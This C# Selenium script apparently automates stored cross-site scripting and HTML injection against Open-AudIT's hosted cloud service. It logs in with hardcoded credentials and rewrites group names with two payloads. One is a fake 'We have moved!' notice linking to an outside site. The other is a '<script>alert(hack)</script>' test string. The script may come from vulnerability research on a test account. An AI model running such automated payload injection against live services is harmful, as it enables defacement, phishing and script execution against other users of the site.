using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Remote;
//using OpenQA.Selenium.Support.UI;
using OpenQA.Selenium.Interactions;

namespace Open_AudIT
{
    public class Auto
    {
        private IWebDriver driver;
        public IDictionary<string, object> vars { get; private set; }
        private IJavaScriptExecutor js;
        public Auto()
        {
            SetUp();
            openAudIT();
            openAudIT2();
            TearDown();
        }
        public void SetUp()
        {
            driver = new ChromeDriver();
            js = (IJavaScriptExecutor)driver;
            vars = new Dictionary<string, object>();
        }
        protected void TearDown()
        {
            driver.Quit();
        }
        public void openAudIT()
        {
            driver.Navigate().GoToUrl("https://opmantek.com/cloud/login?redirect_url=%2Fcloud");
            driver.FindElement(By.Id("username")).SendKeys("testovicius");
            driver.FindElement(By.Id("password")).SendKeys("AlioValio");
            driver.FindElement(By.CssSelector(".btn")).Click();
            driver.FindElement(By.CssSelector(".btn-success")).Click();
            driver.FindElement(By.CssSelector(".btn-success")).Click();
            driver.Navigate().GoToUrl("https://cloud.open-audit.com/en/omk/open-audit/login/");
            driver.FindElement(By.Id("username")).SendKeys("testovicius");
            driver.FindElement(By.Id("password")).SendKeys("AlioValio");
            driver.FindElement(By.CssSelector(".btn")).Click();
            driver.FindElement(By.LinkText("Manage")).Click();
            {
                var element = driver.FindElement(By.LinkText("Groups"));
                Actions builder = new Actions(driver);
                builder.MoveToElement(element).Perform();
            }
            driver.FindElement(By.LinkText("List Groups")).Click();
            driver.FindElement(By.CssSelector(".odd:nth-child(1) .btn-primary")).Click();
            driver.FindElement(By.CssSelector("#edit_name > .glyphicon")).Click();
            driver.FindElement(By.Id("name")).SendKeys("<p>Sorry! We have moved! The new URL is: <a href=\"http://geektyper.com/\\n\">Open-Audit</a></p>");
            driver.FindElement(By.CssSelector(".glyphicon-ok")).Click();
            driver.FindElement(By.CssSelector(".breadcrumb-item:nth-child(2) div")).Click();
            driver.FindElement(By.CssSelector(".odd:nth-child(1) .btn-primary > .glyphicon")).Click();
        }
        public void openAudIT2()
        {
            driver.Navigate().GoToUrl("https://opmantek.com/cloud/login?redirect_url=%2Fcloud");
            driver.FindElement(By.Id("username")).SendKeys("testovicius");
            driver.FindElement(By.Id("password")).SendKeys("AlioValio");
            driver.FindElement(By.CssSelector(".btn")).Click();
            driver.FindElement(By.CssSelector(".btn-success")).Click();
            driver.FindElement(By.CssSelector(".btn-success")).Click();
            driver.Navigate().GoToUrl("https://cloud.open-audit.com/en/omk/open-audit/login/");
            driver.FindElement(By.Id("username")).SendKeys("testovicius");
            driver.FindElement(By.Id("password")).SendKeys("AlioValio");
            driver.FindElement(By.CssSelector(".btn")).Click();
            driver.FindElement(By.LinkText("Manage")).Click();
            {
                var element = driver.FindElement(By.LinkText("Groups"));
                Actions builder = new Actions(driver);
                builder.MoveToElement(element).Perform();
            }
            driver.FindElement(By.LinkText("List Groups")).Click();
            driver.FindElement(By.CssSelector(".even:nth-child(2) .btn-primary > .glyphicon")).Click();
            driver.FindElement(By.CssSelector("#edit_name > .glyphicon")).Click();
            driver.FindElement(By.Id("name")).SendKeys("<script>alert(hack)</script>");
            driver.FindElement(By.CssSelector(".glyphicon-ok")).Click();
            driver.FindElement(By.CssSelector(".breadcrumb-item:nth-child(2) div")).Click();
            driver.FindElement(By.CssSelector(".odd:nth-child(1) .btn-primary > .glyphicon")).Click();
        }
    }
}
